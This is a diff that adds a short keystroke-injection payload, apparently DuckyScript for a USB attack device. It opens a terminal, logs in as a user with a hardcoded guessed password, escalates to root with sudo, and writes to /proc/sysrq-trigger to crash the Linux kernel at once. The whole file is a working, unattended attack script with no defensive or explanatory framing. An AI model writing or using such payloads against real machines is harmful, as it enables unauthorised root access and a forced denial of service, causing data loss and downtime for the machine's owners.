@@ -1,0 +1,12 @@
+CTRL-ALT t
+DELAY 400
+STRINGLN su administrador
+DELAY 600
+STRINGLN administrador
+DELAY 600
+STRINGLN sudo su
+DELAY 600
+STRINGLN administrador
+DELAY 600
+STRINGLN sudo echo c > /proc/sysrq-trigger
+DELAY 600
